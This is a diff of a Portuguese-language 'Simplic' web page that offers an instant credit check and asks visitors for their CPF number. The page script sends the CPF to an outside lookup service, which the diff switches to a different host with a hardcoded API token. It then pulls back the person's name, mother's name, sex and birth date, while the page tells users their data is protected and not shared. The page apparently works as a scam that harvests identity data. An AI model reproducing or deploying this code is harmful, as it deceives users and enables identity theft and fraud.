@@ -1,17 +1,12 @@
-<!DOCTYPE html><html lang="pt-BR"><head>
+
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Simplic - Verificação de CPF</title>
-    <link href="css/bootstrap.min.css" rel="stylesheet">
-    <link rel="stylesheet" href="css/style.css">
-    <script>
-!function(e,t){"object"==typeof exports&&"object"==typeof module?module.exports=t():"function"==typeof define&&define.amd?define([],t):"object"==typeof exports?exports.install=t():e.install=t()}("undefined"!=typeof window?window:self,(function(){return function(e){var t={};function n(o){if(t[o])return t[o].exports;var r=t[o]={i:o,l:!1,exports:{}};return e[o].call(r.exports,r,r.exports,n),r.l=!0,r.exports}return n.m=e,n.c=t,n.d=function(e,t,o){n.o(e,t)||Object.defineProperty(e,t,{enumerable:!0,get:o})},n.r=function(e){"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(e,"__esModule",{value:!0})},n.t=function(e,t){if(1&t&&(e=n(e)),8&t)return e;if(4&t&&"object"==typeof e&&e&&e.__esModule)return e;var o=Object.create(null);if(n.r(o),Object.defineProperty(o,"default",{enumerable:!0,value:e}),2&t&&"string"!=typeof e)for(var r in e)n.d(o,r,function(t){return e[t]}.bind(null,r));return o},n.n=function(e){var t=e&&e.__esModule?function(){return e.default}:function(){return e};return n.d(t,"a",t),t},n.o=function(e,t){return Object.prototype.hasOwnProperty.call(e,t)},n.p="",n(n.s=72)}({72:function(e,t,n){"use strict";var o=this&&this.__spreadArray||function(e,t,n){if(n||2===arguments.length)for(var o,r=0,i=t.length;r<i;r++)!o&&r in t||(o||(o=Array.prototype.slice.call(t,0,r)),o[r]=t[r]);return e.concat(o||Array.prototype.slice.call(t))};Object.defineProperty(t,"__esModule",{value:!0});var r=function(e,t,n){var o,i=e.createElement("script");i.type="text/javascript",i.async=!0,i.src=t,n&&(i.onerror=function(){r(e,n)});var a=e.getElementsByTagName("script")[0];null===(o=a.parentNode)||void 0===o||o.insertBefore(i,a)};!function(e,t,n){e.KwaiAnalyticsObject=n;var i=e[n]=e[n]||[];i.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie"];var a=function(e,t){e[t]=function(){for(var n=[],r=0;r<arguments.length;r++)n[r]=arguments[r];var i=o([t],n,!0);e.push(i)}};i.methods.forEach((function(e){a(i,e)})),i.instance=function(e){var t,n=(null===(t=i._i)||void 0===t?void 0:t[e])||[];return i.methods.forEach((function(e){a(n,e)})),n},i.load=function(e,o){var a="https://s21-def.ap4r.com/kos/s101/nlav112572/pixel/events.js";i._i=i._i||{},i._i[e]=[],i._i[e]._u=a,i._t=i._t||{},i._t[e]=+new Date,i._o=i._o||{},i._o[e]=o||{};var c="?sdkid=".concat(e,"&lib=").concat(n);r(t,a+c,"https://s21-def.ks-la.net/kos/s101/nlav112572/pixel/events.js"+c)}}(window,document,"kwaiq")}})}));
-</script>
-<script>
-kwaiq.load('292343292062303');
-kwaiq.page();
-kwaiq.track('contentView')
-</script>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="../assets/css/style.css">
     
 </head>
 <body>
@@ -19,15 +14,15 @@ kwaiq.track('contentView')
         <div class="container py-2">
             <div class="d-flex justify-content-between align-items-center">
                 <div class="logo d-flex align-items-center">
-                    <img src="images/xlogo.png" alt="Simplic Logo" class="logo-img" data-pagespeed-url-hash="99038477" onload="pagespeed.CriticalImages.checkImageForCriticality(this);">
+                    <img src="../assets/images/xlogo.png" alt="Simplic Logo" class="logo-img" data-pagespeed-url-hash="99038477" onload="pagespeed.CriticalImages.checkImageForCriticality(this);">
                 </div>
                 <div class="menu-icons">
                     <svg class="info-icon" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                        <circle cx="12" cy="12" r="10" stroke="#333333" stroke-width="2"></circle>
-                        <path d="M12 7V12M12 16V16.01" stroke="#333333" stroke-width="2" stroke-linecap="round"></path>
+                        <circle cx="12" cy="12" r="10" stroke="#333333" stroke-width="2"/>
+                        <path d="M12 7V12M12 16V16.01" stroke="#333333" stroke-width="2" stroke-linecap="round"/>
                     </svg>
                     <svg class="menu-icon" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                        <path d="M12 6V6.01M12 12V12.01M12 18V18.01" stroke="#333333" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
+                        <path d="M12 6V6.01M12 12V12.01M12 18V18.01" stroke="#333333" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                     </svg>
                 </div>
             </div>
@@ -40,13 +35,13 @@ kwaiq.track('contentView')
                 <div id="verification-step">
                     <div class="card-header">
                         <svg class="verification-icon" width="40" height="40" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                            <path d="M9 11L12 14L22 4" stroke="#00a651" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
-                            <path d="M21 12V19C21 19.5304 20.7893 20.0391 20.4142 20.4142C20.0391 20.7893 19.5304 21 19 21H5C4.46957 21 3.96086 20.7893 3.58579 20.4142C3.21071 20.0391 3 19.5304 3 19V5C3 4.46957 3.21071 3.96086 3.58579 3.58579C3.96086 3.21071 4.46957 3 5 3H16" stroke="#00a651" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
+                            <path d="M9 11L12 14L22 4" stroke="#00a651" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                            <path d="M21 12V19C21 19.5304 20.7893 20.0391 20.4142 20.4142C20.0391 20.7893 19.5304 21 19 21H5C4.46957 21 3.96086 20.7893 3.58579 20.4142C3.21071 20.0391 3 19.5304 3 19V5C3 4.46957 3.21071 3.96086 3.58579 3.58579C3.96086 3.21071 4.46957 3 5 3H16" stroke="#00a651" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                         </svg>
                     </div>
                     <h2 class="verification-title">Verificação Rápida</h2>
-                    <p class="verification-text">Precisamos realizar uma verificação rpida para definir qual valor de crédito podemos liberar de imediato pra você.</p>
-                    <p class="verification-instruction">Digite somente os números do seu CPF para análise do valor do crédito.</p>
+                    <p class="verification-text">Preciamos realizar uma verificação rapida para definir qual valor de crédito podemos liberar de imediato pra você.</p>
+                    <p class="verification-instruction">Digite somente os números do seu CPF para análise.</p>
                     
                     <div id="notification" class="notification-card">
                         <i class="fas fa-exclamation-circle"></i>
@@ -56,7 +51,7 @@ kwaiq.track('contentView')
                     <form id="cpf-form" class="mt-4">
                         <div class="mb-4">
                             <label for="cpf" class="form-label">CPF</label>
-                            <input type="text" class="form-control form-control-lg" id="cpf" placeholder="000.000.000-00" maxlength="14" required="">
+                            <input type="text" class="form-control form-control-lg" id="cpf" placeholder="000.000.000-00" maxlength="14" required>
                         </div>
                         <button type="submit" class="btn btn-success btn-lg w-100" id="verify-button" onclick="this.innerHTML = '<div class=\'d-flex justify-content-center\'><i class=\'fas fa-spinner fa-spin me-2\'></i>Realizando verificação</div>'">
                             Verificar
@@ -66,16 +61,16 @@ kwaiq.track('contentView')
                     <div class="security-info mt-4">
                         <div class="d-flex align-items-center security-item">
                             <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                                <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="#777" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
-                                <path d="M12 16V12" stroke="#777" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
-                                <path d="M12 8H12.01" stroke="#777" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
+                                <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="#777" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                                <path d="M12 16V12" stroke="#777" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                                <path d="M12 8H12.01" stroke="#777" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                             </svg>
                             <span>Seus dados estão protegidos e não serão compartilhados</span>
                         </div>
                         <div class="d-flex align-items-center security-item mt-2">
                             <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                                <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="#777" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
-                                <path d="M9 12L11 14L15 10" stroke="#777" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
+                                <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="#777" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                                <path d="M9 12L11 14L15 10" stroke="#777" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                             </svg>
                             <span>Análise em tempo real sem afetar seu score</span>
                         </div>
@@ -85,8 +80,8 @@ kwaiq.track('contentView')
                 <div id="results-step" style="display: none;">
                     <div class="text-center mb-4">
                         <svg class="success-icon" width="60" height="60" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                            <circle cx="12" cy="12" r="11" fill="#00a651" stroke="#008d45" stroke-width="1"></circle>
-                            <path d="M7 12L10 15L17 8" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
+                            <circle cx="12" cy="12" r="11" fill="#00a651" stroke="#008d45" stroke-width="1"/>
+                            <path d="M7 12L10 15L17 8" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                         </svg>
                         <h2 class="verification-title mt-3">Verificação Concluída</h2>
                         <p class="verification-text">Encontramos seus dados com sucesso!</p>
@@ -121,8 +116,8 @@ kwaiq.track('contentView')
         </div>
     </footer>
 
-    <script src="js/bootstrap.bundle.min.js"></script>
-    <script src="js/all.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/js/all.min.js"></script>
       <script>
         function showNotification(message) {
             const notification = document.getElementById('notification');
@@ -180,13 +175,12 @@ kwaiq.track('contentView')
             }
 
             try {
-                console.log('Iniciando consulta à API...');
-                const url = `https://searchapi.dnnl.live/consulta?token_api=5145&cpf=${cpf}`;
-
-                console.log('URL da requisição:', url);
+                console.log('Iniciando consulta  API...');
+                const url = `https://bk.elaidisparos.tech/consultar-filtrada/cpf?cpf=${cpf}&token=927492e7841e779b2d605b6309d11c5a463b6c2b89a8fb692cc0496928c5171f`;
+                console.log('URL da requisião:', url);
 
                 const response = await fetch(url, {
-                    method: 'GET'
+                    method: 'GET',
                 });
 
                 console.log('Status da resposta:', response.status);
@@ -194,16 +188,14 @@ kwaiq.track('contentView')
                 const data = await response.json();
                 console.log('Dados recebidos:', data);
 
-                if (response.ok && data.status === 200 && data.dados && data.dados.length > 0) {
+                if (response.ok) {
                     console.log('Consulta bem sucedida');
                     
-                    const usuario = data.dados[0];
-                    
                     const dadosUsuario = {
-                        NOME: usuario.NOME,
-                        MAE: usuario.NOME_MAE || '',
-                        SEXO: usuario.SEXO,
-                        NASCIMENTO: usuario.NASC
+                        NOME: data.nome,
+                        MAE: data.mae || '',
+                        SEXO: data.sexo,
+                        NASCIMENTO: data.nascimento
                     };
                     
                     localStorage.setItem('dadosUsuario', JSON.stringify(dadosUsuario));
@@ -293,6 +285,5 @@ kwaiq.track('contentView')
             }, 2500); // 2.5 segundos de carregamento
         });
     </script>
-
- 
-</body></html>
+</body>
+</html> 
